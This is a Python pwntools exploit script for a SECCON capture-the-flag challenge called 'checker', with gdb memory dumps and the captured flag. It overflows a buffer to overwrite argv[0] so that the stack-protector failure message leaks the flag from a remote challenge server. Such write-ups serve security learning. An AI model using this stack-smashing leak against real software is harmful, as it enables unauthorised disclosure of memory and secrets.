from pwn import *

# SECCON{y0u_c4n'7_g37_4_5h3ll,H4h4h4}

"""
0000| 0x7fffffffde10 --> 0x730061 ('a')
0008| 0x7fffffffde18 --> 0x4007f2 (<read_flag+110>:     mov    rax,QWORD PTR [rbp-0x8])
0016| 0x7fffffffde20 --> 0x7fffffffdf98 --> 0x7fffffffe2ba ("MANPATH=/usr/local/share/nvm/versions/node/v4.6.1/share/man:/usr/local/man:/usr/local/share/man:/usr/share/man")
0024| 0x7fffffffde28 --> 0x400a38 ("flag.txt")
0032| 0x7fffffffde30 --> 0x300000001
0040| 0x7fffffffde38 --> 0xe0841246026b1b00
0048| 0x7fffffffde40 --> 0x7fffffffde60 --> 0x2
0056| 0x7fffffffde48 --> 0x40076e (<init+33>:   mov    rdx,QWORD PTR [rbp-0x8])
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x000000000040091e in main ()
gdb-peda$ searchmem "/home/inndy/checker/checker"
Searching for '/home/inndy/checker/checker' in: None ranges
Found 2 results, display max 2 items:
[stack] : 0x7fffffffe29e ("/home/inndy/checker/checker")
[stack] : 0x7fffffffefdc ("/home/inndy/checker/checker")
gdb-peda$ searchmem 0x7fffffffe29e
Searching for '0x7fffffffe29e' in: None ranges
Found 2 results, display max 2 items:
libc : 0x7ffff7dd23d8 --> 0x7fffffffe29e ("/home/inndy/checker/checker")
[stack] : 0x7fffffffdf88 --> 0x7fffffffe29e ("/home/inndy/checker/checker")
"""

flag = p64(0x6010c0)
gap_size = 0x178

def write(offset):
    for i in range(3, -1, -1):
        io.recvuntil('>> ')
        io.sendline('A' * (offset + i + 4))
    io.recvuntil('>> ')
    io.sendline('A' * offset + flag[:3])

io = remote('checker.pwn.seccon.jp', 14726)
#io = process('./checker'); gdb.attach(io)

# name
io.recvuntil(' : ')
io.sendline('A')

# overwrite pointer to argv[0], and leak flag, also trigger __stack_chk_fail
write(0x178)

io.recvuntil('>> ')
io.sendline('yes')

io.recvuntil(' : ')
io.sendline('A')

io.recvline()
print re.search(r'SECCON\{.+\}', io.recvall()).group()
